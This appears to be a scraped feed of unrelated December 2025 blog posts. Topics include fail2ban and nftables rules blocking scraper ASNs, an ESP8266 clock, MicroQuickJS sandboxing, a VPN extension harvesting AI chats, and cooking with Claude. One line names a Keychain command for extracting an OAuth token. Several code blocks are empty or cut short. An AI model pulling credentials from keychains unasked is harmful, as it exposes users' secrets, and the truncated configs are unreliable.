<p>The really neat trick there is the way it extracts Claude Code's OAuth token from the macOS Keychain using the <code>security find-generic-password</code> command. I ended up using that trick in <code>claude-code-transcripts</code> itself!</p>

(date: 2025-12-25)
      <p>
      <h1>2025-12-23 A problem in the Butlerian Jihad setup</h1>
<p>I think there’s a problem with <a href="https://transjovian.org/view/fight-bots/index">the setup</a> that defends my sites against the scraper-bots.
I think I have ASNs banned but when I check the logs, requests are still getting through.
As a result, Community Wiki is still down.</p>
<p>Let’s delve right in. If you’re interested in scripts and shell aliases, see the <a href="/admin">admin folder</a>.</p>
<p>These ASNs are my top hitters on Community Wiki right now:</p>
<pre><code>10min-access-log \
  | awk '/^communitywiki/ {print $2}' \
  | asncounter --top 3 --no-prefixes 2&gt;/dev/null
count	percent	ASN	AS
122	3.12	28573	Claro NXT Telecomunicacoes Ltda, BR
84	2.15	45899	VNPT-AS-VN VNPT Corp, VN
54	1.38	9541	CYBERNET-AP Cyber Internet Services Pvt Ltd., PK
unique ASN: 1607
total lookups: 3906
total skipped: 0
total failed: 0

</code></pre>
<p>And yet, the ASN seems to be banned!</p>
<pre><code>asn-banned 28573
28573 banned for 1h: 1
28573 banned for 1w: 0

</code></pre>
<p>Let’s check:</p>
<pre><code>10min-access-log | asn-access-log 28573 | tail -n 1
communitywiki.org:443 187.23.18.103 - - [23/Dec/2025:09:05:17 +0100] &quot;GET /wiki?action=rc&amp;all=0&amp;days=7&amp;rcfilteronly=tag%3Aprojects&amp;showedit=0 HTTP/1.1&quot; 410 3928 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36&quot; 379

</code></pre>
<p>This IP address doesn’t seem to be banned after all!</p>
<pre><code>fail2ban-client banned 187.23.18.103
[[]]

</code></pre>
<p>Nor is the range banned:</p>
<pre><code>asn-find '187.23.18.103'
187.23.0.0/19	28573	Claro NXT Telecomunicacoes Ltda, BR
fail2ban-client banned 187.23.0.0/19
[[]]

</code></pre>
<p>What is going on? It’s definitely not banned:</p>
<pre><code>fail2ban-client banned | sed 's/\'/&quot;/g' | jq | grep 187.23.0.0/19

</code></pre>
<p>No results. And that seems to be the problem. <code>asn-networks</code> doesn’t list <code>187.23.0.0/19</code> as belonging to ASN 28573 even though looking up <code>187.23.18.103</code> says it belongs to ASN 28573!</p>
<pre><code>asn-networks 28573 | grep  '^187\.23\.'

</code></pre>
<p>No results. So let’s check whether this range is subsumed in some other range.</p>
<pre><code>asn-networks 28573 | grep  '^187\.2'
187.2.0.0/15
187.20.0.0/14
187.255.0.0/16

</code></pre>
<p>Indeed!</p>
<pre><code>cidr-to-ip-range 187.20.0.0/14
187.20.0.0 - 187.23.255.255

</code></pre>
<p>So this IP range covers the IP number we’re interested in.</p>
<pre><code>fail2ban-client banned 187.20.0.0/14
[['butlerian-jihad']]

</code></pre>
<p>OK! I’m happy to see this.
So now the question is, why are requests from <code>187.23.18.103</code> not dropped?</p>

</code></pre>
<p>No results. So it does seem like fail2ban is not working as I expected.</p>
<p>Looking for errors in the <code>fail2ban</code> log file, I find a lot of entries like this one:</p>

<p>So <code>fail2ban</code> manages to record the fact, that <code>187.20.0.0/14</code> is banned, and unbans it correctly, but the actual ban itself runs into an error!</p>

</code></pre>
<p>I guess this is key: “Error: You must add ‘flags interval’ to your set declaration if you want to add prefix elements”.</p>
<p>I didn’t know <code>fail2ban</code> was using <code>nft</code>. I must take a look at <code>/etc/fail2ban/action.d/nftables-multiport.conf</code>, I guess.</p>
<p>I’ve been looking at <a href="https://itsfoss.gitlab.io/blog/fail2ban-with-iptables-persistent/">Securing Your Server: Integrating Fail2ban with IPTables-Persistent for Enhanced Protection</a> and it makes me think I might use ipsets instead.
I’m hoping that won’t be too hard since I already use <code>ipset</code> for my allowlists and my permanent banlists.
See <a href="2025-07-11-allow-list">2025-07-11 A separate allow-list to bypass fail2ban</a>.</p>
<p>When I do the switch, I must remember to flush the lists that <code>fail2ban</code> is currently using. If there are entries on the old list, they would stay there forever if the commands to add and remove entries got changed.</p>
<p>I also learned that Debian installs tools that look like <code>iptables</code> but they’re actually a compatibility layer that use <code>nft</code> instead.</p>
<blockquote>
<p>“The iptables Debian package install both and gives the nft version more priority by default in the update-alternatives system. This means that if you install this package, you will be using the nft tools instead of the legacy ones.” – <code>/usr/share/doc/iptables/README.Debian</code></p>
</blockquote>
<p>🤯</p>
<p>This is why <code>fail2ban</code> uses <code>iptables</code> but the error messages mention <code>nft</code>.</p>
<p>So here is what I ended up doing.</p>
<p>I switched from <code>iptables</code> to <code>nft</code> by creating a new file <code>/etc/fail2ban/jail.local</code>:</p>
<pre><code>[DEFAULT]
banaction = nftables[type=multiport]
banaction_allports = nftables[type=allports]

</code></pre>
<p>I created a local override for the nftables action so that <code>flags interval</code> gets added to the sets, and to add my allow-lists.
Here’s <code>/etc/fail2ban/action.d/nftables.local</code>.</p>
<pre><code># -*- mode: Conf -*-
[Definition]
# add &quot;flags interval;&quot;
# add special allowlists
_nft_add_set = &lt;nftables&gt; add set &lt;table_family&gt; &lt;table&gt; &lt;addr_set&gt; \{ type &lt;addr_type&gt;\; flags interval\; \}
              &lt;_nft_for_proto-&lt;type&gt;-iter&gt;
              &lt;nftables&gt; add rule &lt;table_family&gt; &lt;table&gt; &lt;chain&gt; %(rule_stat)s
              &lt;_nft_for_proto-&lt;type&gt;-done&gt;
	     /etc/butlerian-jihad/add-allowlist

</code></pre>
<p>To confirm, you can list all tables and then list the <code>f2b-table</code>. It contains all the sets, one for each jail of yours. The important part is that it says <code>flags interval</code> in there.</p>
<pre><code>nft list sets inet f2b-table

</code></pre>
<p>Note that if you check the <code>fail2ban</code> log, you’ll still find errors such as “interval overlaps with an existing one”. That’s OK, though. No double-banning, I guess. 😅</p>
<p>But wait, what about <code>/etc/butlerian-jihad/add-allowlist</code>? This is where I add my manual allow-list. Like <code>wilderland.ovh</code>, the other IRC server in our little network:</p>
<pre><code>#!/usr/sbin/nft -f

# define the sets
add set inet f2b-table allowlist   { type ipv4_addr; flags interval; }
add set inet f2b-table allowlist6  { type ipv6_addr; flags interval; }
add set inet f2b-table gotosocial  { type ipv4_addr; flags interval; }
add set inet f2b-table gotosocial6 { type ipv6_addr; flags interval; }

# insert rules at the beginning
insert rule inet f2b-table f2b-chain tcp dport 0-65535 ip  saddr @allowlist   accept
insert rule inet f2b-table f2b-chain tcp dport 0-65535 ip6 saddr @allowlist6  accept
insert rule inet f2b-table f2b-chain tcp dport 0-65535 ip  saddr @gotosocial  accept
insert rule inet f2b-table f2b-chain tcp dport 0-65535 ip6 saddr @gotosocial6 accept

add element inet f2b-table allowlist {
  51.83.186.78 comment &quot;kyonshi and wilderland.ovh&quot;,
  # and a few more
}

add element inet f2b-table allowlist6 {
   2001:41d0:601:1100::12d comment &quot;kyonshi and wilderland.ovh&quot;,
  # and a few more
}

include &quot;/etc/butlerian-jihad/gotosocial.nft&quot;

</code></pre>
<p>And what about that <code>/etc/butlerian-jihad/gotosocial.nft</code> file?
That’s generated every now and then from the local database so that all the IP numbers of instances where I follow someone or where someone follows me are on the allow list.
I generate it using a script called <code>/etc/butlerian-jihad/gotosocial-prepare</code>
This script is a <code>bash</code> script instead of a <code>fish</code> script because <code>fish</code> requires a directory where it writes its history.
I found out when I had a gazillion protections in place.
But then I could not get the script to access the database so I removed all the protections.
And now I feel silly because the script is still written in <code>bash</code> but I prefer <code>fish</code>.</p>
<pre><code>#!/usr/bin/bash
# Redirect the output of this script into /etc/butlerian-jihad/gotosocial.nft
set -e

</code></pre>
<p>If you run it, it prints the results to <code>stdout</code> and the progress messages to <code>stderr</code>.</p>
<p>You can redirect it to a file:</p>
<pre><code>./gotosocial-prepare &gt; gotosocial.nft

</code></pre>
<p>The content looks something like this:</p>
<pre><code>#!/usr/sbin/nft

# 2025-12-25

flush set inet f2b-table gotosocial
flush set inet f2b-table gotosocial6

add element inet f2b-table gotosocial {
  78.47.204.93 comment &quot;berlin.social&quot;,
  # and many more
}

add element inet f2b-table gotosocial6 {
  2a01:4f8:c0c:3093::1 comment &quot;berlin.social&quot;,
  # and many more
}

</code></pre>
<p>And now for the <code>systemd</code> integration.</p>
<p>The unit file is <code>/etc/butlerian-jihad/gotosocial-prepare.service</code>:</p>
<pre><code>[Unit]
Description=Update the allow-list for gotosocial

[Service]
Type=oneshot
ExecStart=sh -c '/etc/butlerian-jihad/gotosocial-prepare | tee /etc/butlerian-jihad/gotosocial.nft | nft -f -'

</code></pre>
<p>Enable it:</p>
<pre><code>systemctl enable /etc/butlerian-jihad/gotosocial-prepare.service

</code></pre>
<p>It complains that there is no way to run it since the timer is missing but we’re not ready, yet.</p>
<p>The command here saves a copy in <code>/etc/butlerian-jihad/gotosocial.nft</code>.
This copy is important because it’s the script called when <code>fail2ban</code> starts up and calls <code>/etc/butlerian-jihad/add-allowlist</code> which includes it.
The service also pipes the output straight to <code>nft</code> to execute it.</p>
<p>Test it:</p>
<pre><code>systemctl start gotosocial-prepare-service

</code></pre>
<p>Assuming it works … we need a monthly timer, now.</p>
<p>The timer file is <code>/etc/butlerian-jihad/gotosocial-prepare.timer</code>:</p>
<pre><code>[Unit]
Description=Update the allow-list for gotosocial

[Timer]
OnCalendar=1month
RandomizedDelaySec=600

[Install]
WantedBy=timers.target

</code></pre>
<p>Enable and start it:</p>
<pre><code>systemctl enable --now ./gotosocial-prepare.timer

</code></pre>
<p>Check it:</p>
<pre><code>systemctl status gotosocial-prepare.timer

</code></pre>
<p>And now the allow-list should refresh every month. 😍</p>
<p>A note on why the allow lists cannot be in a separate table.
The key is this little info in the documentation, as I had to find out:</p>
<blockquote>
<p>“If a packet is accepted and there is another chain, bearing the same hook type and with a later priority, then the packet will subsequently traverse this other chain. Hence, an accept verdict – be it by way of a rule or the default chain policy – isn’t necessarily final.”</p>
</blockquote>
<p>So if the allow-list is in an earlier chain and is accepted, the later <code>fail2ban</code> chain can still drop the packets. Conversely, if the <code>fail2ban</code> chain comes first, the packets dropped are no longer available in later chains so the decision cannot be reversed.
The sets with the addresses have to be in the <code>f2b-table</code> and the rules using them have to be in the <code>f2b-chain</code>.</p>
<p>You might be wondering: Why is nobody else running into all this? The answer, I think, is that I started out banning whole ASNs, that is, all their IP address ranges. So now <code>fail2ban</code> manages address ranges instead of individual addresses and I can no longer use <code>fail2ban</code>’s <code>ignoreip</code> command which is probably what everybody else is using. But I want to ban the address ranges and allow individual addresses within those ranges.</p>

      <h1>I made another little bedside clock</h1>

(date: 2025-12-25)
      <p>
      <p>I call it 'Bedtime'</p>
<p>The other day I saw <a href="https://www.youtube.com/watch?v=S1Q9PZ95SDM">a video by someone who bought a $16 electronic clock</a>, and it looked interesting, because that little clock had been taunting me for months by showing up constantly in my AliExpress recommendations.
I held off on buying it because what am I going to do with <a href="/posts/do-not-be-alarmed-clock/">yet another clock</a>, but the video said that it has an ESP8266 inside, and that, with a little soldering and programming, you could run <a href="https://esphome.io">ESPhome</a> on it!</p>
<p>Obviously, I didn’t need any more convincing, though I remembered this clock being listed for <span class="math inline">\(6 for a while, and balked at the \)</span>16 the video mentioned.
I ordered <a href="https://www.aliexpress.com/item/1005009145344721.html">a different listing, which I found for $12</a>, hoping it would be the same as the one from the video.</p>
<p>Fairly serendipitously for this purchase, the <a href="/posts/do-not-be-alarmed-clock/">last bedside clock I made</a> was showing its age a bit.
Mainly, the dimmest setting on its screen was bright enough to be annoying when I’m in bed, and the screen has been burned-in quite a bit.
A new monochrome OLED screen is an easy fix, but I’d prefer a color one (especially if it can be dimmed more), so hopefully I’d be able to replace the Do Not Be Alarmed clock with this new one.</p>
<p>The new clock arrived promptly, and I</p>

John imagines if St. Nick were just a little more creepy, and just a little more honest. The toggling between admission and apology makes for some very fun moments.</p>

Kevin’s piece has some truly great bad notes—you can really picture the kind of people who might have these particular kinds of simultaneously over- and under-thought pitches. An amazing, subtle kicker here too.</p>

<p><code>uv</code> has a useful <code>uv init</code> command for setting up new Python projects, but it comes with a bunch of different options like <code>--app</code> and <code>--package</code> and <code>--lib</code> and I wasn't sure how they differed.</p>
<p>So I created this GitHub repository which demonstrates all of those options, generated using this <a href="https://github.com/simonw/uv-init-demos/blob/main/update-projects.sh">update-projects.sh</a> script ( <a href="https://gistpreview.github.io/?9cff2d3b24ba3d5f423b34abc57aec13">thanks, Claude</a>) which will run on a schedule via GitHub Actions to capture any changes made by future releases of <code>uv</code>.</p>

      <p>
      <p>This is <a href="https://www.koi.ai/blog/urban-vpn-browser-extension-ai-conversations-data-collection">pretty scary</a>:</p>
<blockquote>
<p>Urban VPN Proxy targets conversations across ten AI platforms: ChatGPT, Claude, Gemini, Microsoft Copilot, Perplexity, DeepSeek, Grok (xAI), Meta AI.</p>
<p>For each platform, the extension includes a dedicated “executor” script designed to intercept and capture conversations. The harvesting is enabled by default through hardcoded flags in the extension’s configuration.</p>
<p>There is no user-facing toggle to disable this. The only way to stop the data collection is to uninstall the extension entirely.</p>
<p>[…]</p>
<p>The data collection operates independently of the VPN functionality. Whether the VPN is connected or not, the harvesting runs continuously in the background...</p>

      <h1>What Does 1 Trillion Web Pages Sound Like?</h1>

(date: 2025-12-24)
      <p>
      <p>For this special holiday episode, we’re celebrating the Internet Archive’s milestone of 1 trillion web pages archived with something a little different: live music created just for the occasion.</p>
<p>Join us for conversations with composer <strong>Erika Oba</strong>, composer <strong>Sam Reider</strong>, and cellist <strong>Kathryn Bates</strong> of the <strong>Del Sol Quartet</strong>, recorded around <strong>The Vast Blue We</strong>, the concert held at the Internet Archive to honor our shared digital memory. Two new commissions premiered that night: Oba’s <strong>“Blue Lights”</strong> and Reider’s <strong>“Quartet for a Trillion,”</strong> both written to capture the wonder and scale of the open web—and brought to life by Del Sol Quartet. Oba later reconfigured “Blue Lights” for a solo performance during The Web We’ve Built celebration.</p>
<p>In this episode, you’ll hear brief conversations with the artists about their creative process, followed by recordings from the performance itself. A short, reflective holiday release that celebrates collaboration, imagination, and what we can build together.</p>

      <h1>No stars</h1>

(date: 2025-12-24)
      <p>
      <p>It’s getting towards the end of the year. That’s when I put together <a href="https://adactio.com/journal/tags/books,202">a post reviewing the books I’ve read in the previous twelve months</a>.</p>
<p>I think I might change things up in 2026. Instead of waiting until the end of the year to write all the little reviews at once, I think I should write a review as soon as I finish a book. Instead of holding onto my reckons for months, I can just set them free one at a time.</p>
<p>And I think I’m done with ratings. Stars. I’m not sure why I ever started, to be honest. Probably because <a href="https://adactio.com/journal/22296">everyone else was doing it</a>. But they kind of just get in the way. I spend far too long deliberating about how many stars to give a book when I should be spending that time describing the effect that the book had on me.</p>
<p>In any case, books, movies, music …it’s all entirely subjective. Assigning stars gives a veneer of something measurable, countable, and objective. That’s not how art works.</p>
<p>But that’s just my opinion.</p>
<p>I think I’ve also developed more of an aversion to scoring things the more it’s crept into everyday life. It feels like you can’t perform any kind of transaction without being asked later to rate the experience.</p>
<p>I remember the first time I was ever in an Uber. This was many years ago in San Francisco. I was with a bunch of friends at an after-party for An Event Apart in the TypeKit offices. Someone suggested that we move on to a second location and proceeded to whip out the Uber app.</p>
<p>I remember looking at the little icon of the car moving in real time as it approached our location. So futuristic!</p>
<p>We all bundled into the car and off we went. The driver was a really nice guy. But at some point he made a navigational error and took us off track. He fixed it, but I remember my friend who had summoned the Uber was kind of miffed.</p>
<p>When we were getting out of the car, the driver apologised profusely before driving off. My friend—who was basically showing me how this whole Uber thing worked—explained that he would now give a less than stellar review for the driver, becuase of that directional snafu.</p>
<p>“Ah, come on”, I said, “he was a nice guy.”</p>
<p>“This is how the app gets accurate data”, he responded.</p>
<p>“But …it’s a person”, I said.</p>
<p>Something about reviewing a person felt so wrong to me. Books, movies, music …I get it. But applying the same logic to a human being. That just didn’t sit right with me.</p>
<p>Now we’re expected to review humans all the time. It still feels wrong to me.</p>
<p>That’s probably why I’m done with ratings. No more stars from me.</p>

<p>If this [MicroQuickJS] had been available in 2010, Redis scripting would have been JavaScript and not Lua. Lua was chosen based on the implementation requirements, not on the language ones... (small, fast, ANSI-C). I appreciate certain ideas in Lua, and people love it, but I was never able to <em>like</em> Lua, because it departs from a more Algol-like syntax and semantics without good reasons, for my taste. This creates friction for newcomers. I love friction when it opens new useful ideas and abstractions that are worth it, if you learn SmallTalk or FORTH and for some time you are lost, it's part of how the languages are different. But I think for Lua this is not true enough: it feels like it departs from what people know without good reasons.</p>

      <h1>MicroQuickJS</h1>

(date: 2025-12-23)
      <p>
      <p><strong><a href="https://github.com/bellard/mquickjs">MicroQuickJS</a></strong></p>
<p>New project from programming legend Fabrice Bellard, of ffmpeg and QEMU and QuickJS and <a href="https://bellard.org">so much more</a> fame:</p>
<blockquote>
<p>MicroQuickJS (aka. MQuickJS) is a Javascript engine targetted at embedded systems. It compiles and runs Javascript programs with as low as 10 kB of RAM. The whole engine requires about 100 kB of ROM (ARM Thumb-2 code) including the C library. The speed is comparable to QuickJS.</p>
</blockquote>
<p>It supports <a href="https://github.com/bellard/mquickjs/blob/17ce6fe54c1ea4f500f26636bd22058fce2ce61a/README.md#javascript-subset-reference">a subset of full JavaScript</a>, though it looks like a rich and full-featured subset to me.</p>
<p>One of my ongoing interests is sandboxing: mechanisms for executing untrusted code - from end users or generated by LLMs - in an environment that restricts memory usage and applies a strict time limit and restricts file or network access. Could MicroQuickJS be useful in that context?</p>
<p>I fired up Claude Code for web (on my iPhone) and kicked off <a href="https://simonwillison.net/2025/Nov/6/async-code-research/">an asynchronous research project</a> to see explore that question:</p>
<p>My full prompt <a href="https://github.com/simonw/research/pull/50#issue-3757781692">is here</a>. It started like this:</p>
<blockquote>
<p><code>Clone https://github.com/bellard/mquickjs to /tmp</code></p>
<p><code>Investigate this code as the basis for a safe sandboxing environment for running untrusted code such that it cannot exhaust memory or CPU or access files or the network</code></p>
<p><code>First try building python bindings for this using FFI - write a script that builds these by checking out the code to /tmp and building against that, to avoid copying the C code in this repo permanently. Write and execute tests with pytest to exercise it as a sandbox</code></p>
<p><code>Then build a &quot;real&quot; Python extension not using FFI and experiment with that</code></p>
<p><code>Then try compiling the C to WebAssembly and exercising it via both node.js and Deno, with a similar suite of tests [...]</code></p>
</blockquote>
<p>I later added to the interactive session:</p>
<blockquote>
<p><code>Does it have a regex engine that might allow a resource exhaustion attack from an expensive regex?</code></p>
</blockquote>
<p>(The answer was no - the regex engine calls the interrupt handler even during pathological expression backtracking, meaning that any configured time limit should still hold.)</p>
<p>Here's <a href="https://gistpreview.github.io/?6e07c54db7bb8ed8aa0eccfe4a384679">the full transcript</a> and the <a href="https://github.com/simonw/research/blob/main/mquickjs-sandbox/README.md">final report</a>.</p>
<p>Some key observations:</p>
<ul>
<li>MicroQuickJS is <em>very</em> well suited to the sandbox problem. It has robust near and time limits baked in, it doesn't expose any dangerous primitive like filesystem of network access and even has a regular expression engine that protects against exhaustion attacks (provided you configure a time limit).</li>
<li>Claude span up and tested a Python library that calls a MicroQuickJS shared library (involving a little bit of extra C), a compiled a Python binding and a library that uses the original MicroQuickJS CLI tool. All of those approaches work well.</li>
<li>Compiling to WebAssembly was a little harder. It got a version working in Node.js and Deno and Pyodide, but the Python libraries wasmer and wasmtime proved harder, apparently because &quot;mquickjs uses setjmp/longjmp for error handling&quot;. It managed to get to a working wasmtime version with <a href="https://github.com/simonw/research/blob/main/mquickjs-sandbox/README.md#working-solution">a gross hack</a>.</li>
</ul>
<p>I'm really excited about this. MicroQuickJS is tiny, full featured, looks robust and comes from excellent pedigree. I think this makes for a very solid new entrant in the quest for a robust sandbox.</p>
<p><strong>Update</strong>: I had Claude Code build <a href="https://tools.simonwillison.net/microquickjs">tools.simonwillison.net/microquickjs</a>, an interactive web playground for trying out the WebAssembly build of MicroQuickJS, adapted from my previous <a href="https://tools.simonwillison.net/quickjs">QuickJS plaground</a>. My QuickJS page loads 2.28 MB (675 KB transferred). The MicroQuickJS one loads 303 KB (120 KB transferred).</p>
<p>Here are <a href="https://github.com/simonw/tools/pull/180#issue-3758595291">the prompts I used</a> for that.</p>

      <p><img src="https://imgs.scripting.com/2025/12/23/veritas.png" alt="">Sometimes you think of things 22 years too late, like this time. I wish I had thought of meeting with the <a href="https://daytona.scripting.com/search?q=%22Harvard%20Crimson%22">Harvard Crimson</a> people in 2003 and made the same offer to them that I had made to NYT the year before, ie we should offer blogs to everyone on staff, and anyone they quote, or basically anyone they want to be writing on the web, which was still a new thing -- and we'd host them alongside the ones we were hosting at the law school. Had we done that there would be a scholarly and intellectual equivalent to Facebook which was also booting up on the <em>same campus</em> at the same time as blogging and podcasting. Love and intellect, that's a good combination for young super-achievers.</p>

      <p>On Sunday evening, CBS News Editor-in-Chief Bari Weiss killed a 60 Minutes segment about men deported to El Salvador’s CECOT mega-prison—a story that had been screened five times, cleared by CBS attorneys, cleared by Standards and Practices, and was scheduled to air in less than three hours.</p>

<p>The first, it said, was carried out by the pro-Russian group known as Z-Pentest and the second by NoName057(16), which has links to the Russian state.</p>

(date: 2025-12-23)
      <p>
      <p>I've been having an absurd amount of fun recently using LLMs for cooking. I started out using them for basic recipes, but as I've grown more confident in their culinary abilities I've leaned into them for more advanced tasks. Today I tried something new: having Claude vibe-code up a custom application to help with the timing for a complicated meal preparation. It worked really well!</p>
<h4>A custom timing app for two recipes at once</h4>
<p>We have family staying at the moment, which means cooking for four. We subscribe to a meal delivery service called <a href="https://www.greenchef.com/">Green Chef</a>, mainly because it takes the thinking out of cooking three times a week: grab a bag from the fridge, follow the instructions, eat.</p>
<p>Each bag serves two portions, so cooking for four means preparing two bags at once.</p>
<p>I have done this a few times now and it is always a mad flurry of pans and ingredients and timers and desperately trying to figure out what should happen when and how to get both recipes finished at the same time. It's fun but it's also chaotic and error-prone.</p>
<p>This time I decided to try something different, and potentially even more chaotic and error-prone: I outsourced the planning entirely to Claude.</p>
<p>I took this single photo of the two recipe cards side-by-side and fed it to Claude Opus 4.5 (in the Claude iPhone app) with this prompt:</p>
<blockquote>
<p>Extract both of these recipes in as much detail as possible</p>
<p><img src="https://static.simonwillison.net/static/2025/recipe-cards.jpg" alt="Two recipe cards placed next to each other on a kitchen counter. Each card has detailed instructions plus photographs of steps."></p>
</blockquote>
<p>This is a moderately challenging vision task in that there quite a lot of small text in the photo. I wasn't confident Opus could handle it.</p>
<p>I hadn't read the recipe cards myself. The responsible thing to do here would be a thorough review or at least a spot-check - I chose to keep things chaotic and didn't do any more than quickly eyeball the result.</p>
<p>I asked what pots I'd need:</p>
<blockquote>
<p>Give me a full list of pots I would need if I was cooking both of them at once</p>
</blockquote>
<p>Then I prompted it to build a custom application to help me with the cooking process itself:</p>
<blockquote>
<p>I am going to cook them both at the same time. Build me a no react, mobile, friendly, interactive, artifact that spells out the process with exact timing on when everything needs to happen have a start setting at the top, which starts a timer and persists when I hit start in localStorage in case the page reloads. The next steps should show prominently with countdowns to when they open. The full combined timeline should be shown slow with calculated times tor when each thing should happen</p>
</blockquote>
<p>I copied the result out onto my own hosting ( <a href="https://tools.simonwillison.net/blackened-cauliflower-and-turkish-style-stew">you can try it here</a>) because I wasn't sure if localStorage would work inside the Claude app and I <em>really</em> didn't want it to forget my times!</p>
<p>Then I clicked &quot;start cooking&quot;!</p>
<p><img src="https://static.simonwillison.net/static/2025/recipe-timer.gif" alt="The recipe app shows a full timeline with 00:00 Preheat Oven and onwards, plus a big Start Cooking button. In the animation clicking the button starts a timer clicking up, adds a Do this now panel showing the Start all prep work step, shows Coming Up Next with timers counting down to the next steps and updates the full timeline to show local clock times where it previously showed durations from 00:00 upwards."></p>
<p>Here's the <a href="https://claude.ai/share/4acab994-c22b-4ddf-81bd-2f22d947c521">full Claude transcript</a>.</p>
<p>There was just one notable catch: our dog, Cleo, knows <em>exactly</em> when her dinner time is, at 6pm sharp. I forgot to mention this to Claude, which had scheduled several key steps colliding with Cleo's meal. I got woofed at. I deserved it.</p>
<p>To my great surprise, <em>it worked</em>. I followed the recipe guide to the minute and served up both meals exactly 44 minutes after I started cooking.</p>
<p><img src="https://static.simonwillison.net/static/2025/recipe-finished.jpg" alt="A small bowl (a beautiful blue sea textured bowl, made by Natalie Downe) contains a chickpea stew. A larger black bowl has couscous, green beans and blackened cauliflower."></p>
<p>The best way to learn the capabilities of LLMs is to throw tasks at them that may be beyond their abilities and see what happens. In this case I fully expected that something would get forgotten or a detail would be hallucinated and I'd end up scrambling to fix things half way through the process. I was surprised and impressed that it worked so well.</p>
<p>Some credit for the app idea should go to my fellow hackers at <a href="https://devfort.com/fort/2/">/dev/fort 2 in 2009</a>, when we rented Knockbrex Castle in Dumfries, Scotland for a week and attempted to build a cooking timer application for complex meals.</p>
<h4>Generating recipes from scratch</h4>
<p>Most of my other cooking experiments with LLMs have been a whole lot simpler than this: I ask for a recipe, ask for some variations and then cook one of them and see what happens.</p>
<p>This works remarkably well considering LLMs have no taste buds.</p>
<p>I've started to think of this as asking LLMs for the <em>average</em> recipe for a dish, based on all of the recipes they have hoovered up during their training. It turns out the mean version of every guacamole recipe on the internet is a decent guacamole!</p>
<p>Here's an example of a recipe I tried recently that worked out really well. I was helping Natalie run her ceramic stall at the farmers market and the stall next to us sold excellent dried beans. I've never used dried beans before, so I took a photo of their selection and asked Claude what I could do with them:</p>
<blockquote>
<p><img src="https://static.simonwillison.net/static/2025/beans-1.jpg" alt="Several bags of tasty looking beans of different varieties and colors"><img src="https://static.simonwillison.net/static/2025/beans-2.jpg" alt="More bags of beans."></p>
<p>Identify these beans</p>
</blockquote>
<p>It took a guess at the beans, then I said:</p>
<blockquote>
<p>Get me excited about cooking with these! If I bought two varietiew what could I make</p>
</blockquote>
<p>&quot;Get me excited&quot; switches Claude into a sort of hype-man mode, which is kind of entertaining:</p>
<blockquote>
<p>Oh, you're about to enter the <em>wonderful</em> world of bean cooking! Let me get you pumped about some killer two-bean combos: [...]</p>
<p><strong>Mixed bean salad</strong> with lemon, olive oil, fresh herbs, cherry tomatoes - light but satisfying [...]</p>
</blockquote>
<p>I replied:</p>
<blockquote>
<p>OK Bean salad has me interested - these are dried beans. Give me some salad options I can make that would last a long time in the fridge</p>
</blockquote>
<p>... and after some back and forth we arrived on the <a href="https://claude.ai/share/c7534766-22d8-481b-bd80-a21abc53f5b2">recipe in this transcript</a>, which I cooked the following day (asking plenty of follow-up questions) and thoroughly enjoyed.</p>
<p>I've done this a bunch of times with a bunch of different recipes across both Claude and ChatGPT and honestly I've not had a notable miss yet. Being able to say &quot;make it vegan&quot; or &quot;I don't have coriander, what can I use instead?&quot; or just &quot;make it tastier&quot; is a really fun way to explore cooking.</p>
<p>It's also fun to repeat &quot;make it tastier&quot; multiple times to see how absurd you can get.</p>
<h4>I really want someone to turn this into a benchmark!</h4>
<p>Cooking with LLMs is a lot of fun. There's an opportunity here for a <em>really</em> neat benchmark: take a bunch of leading models, prompt them for recipes, follow those recipes and taste-test the results!</p>
<p>The logistics of running this are definitely too much for me to handle myself. I have enough trouble cooking two meals at once, for a solid benchmark you'd ideally have several models serving meals up at the same time to a panel of tasters.</p>
<p>If someone else wants to try this please let me know how it goes!</p>

      <p><img src="https://imgs.scripting.com/2024/05/21/magazineCover.png" alt="">I hate to see AT Proto use up creativity of web developers that imho haven't realized that they're pouring their ideas and work into someone else's platform, and that in the end they will control every bit of content that flows through their network. They might let you in, but I doubt they would do that until they had a feature that competes with your add-in.</p>
<p>Sure you can build another network using their identity system, and that was exactly the deal Twitter offered us. I went for it -- who wants to develop a new identity system, when good old Twitter was letting us use theirs. I really think they meant well, sort of fits in with Jack Dorsey's way of looking at things.</p>
<p>It was a good deal for a lot of years, but then one day Elon Musk bought the company, and soon all bets were off. We had little warning before we had to move our act and all our users to another identity system. Lost a lot of traction right there.</p>
<p>My advice -- think this through, now. And if you can't see a way that you share in the success of the company behind Bluesky, which we know very little about, then I urge you to at least have the web as a backup. Use a standard format to broadcast your writer's work to places outside the AT Proto-verse, so we can pick up your signal, and you'll still be on the air if they yank your chain. This alone might get the Bluesky folk to listen to you more carefully. My experience, no matter how much you want, you can't wish away the economics of this stuff.</p>

      <p>One of the reasons ChatGPT dominates in discussions about scientific issues is that it can type at a much high rate than a human can, and produces reams of ways of saying the same thing, and again always tries to take over the lead in determining which direction to go next. It leads to ridiculous situations where it's guessing at what FeedLand does, and it's all over the map, but I actually know what it does, because I wrote it and support it. It's not funny, it's very bad for getting things done. You can tell it to talk less, and for a while it remembers, but in a few days it'll be doing it again. Yet it still is very very useful. It's just talks too much. Kind of like the way if I put my name in a search query on Google it asks if I really meant &quot;winter&quot; instead of my actual last name, which it knows. Stupid f'ing machines.</p>

      <h1>NIST was 5 μs off UTC after last week's power cut</h1>

(date: 2025-12-22)
      <p>
      <p>NIST was 5 μs off UTC after last week's power cut</p>
<p>If you were 5 microseconds late today, blame it on NIST.</p>
<p>Their facility in Boulder Colorado just had its power cut for multiple days. After a backup generator failed, their main ensemble clock lost track of UTC, or Universal Time Coordinated.</p>
<p>But even if you used the <a href="https://tf.nist.gov/tf-cgi/servers.cgi">NTP timing servers they run</a>, they were never off by more than 5 microseconds.</p>
<p>5 μs might seem insignificant. But it <em>is</em> significant for scientists and universities who rely on NIST's more <a href="https://wsts.atis.org/wp-content/uploads/2023/03/04-Judah-Levine.The-NIST-Fiber-Based-Time-Service.pdf">specialized timing signals</a>.</p>
<p>But no, you don't need to panic. And yes, they have it under control now.</p>
<p>But I thought I'd go over what happened, what it means, and what we can learn from NIST's near-outage.</p>

      <h1>Using Claude in Chrome to navigate out the Cloudflare dashboard</h1>

(date: 2025-12-22)
      <p>
      <p>I just had my first success using a browser agent - in this case the <a href="https://support.claude.com/en/articles/12012173-getting-started-with-claude-in-chrome">Claude in Chrome extension</a> - to solve an actual problem.</p>
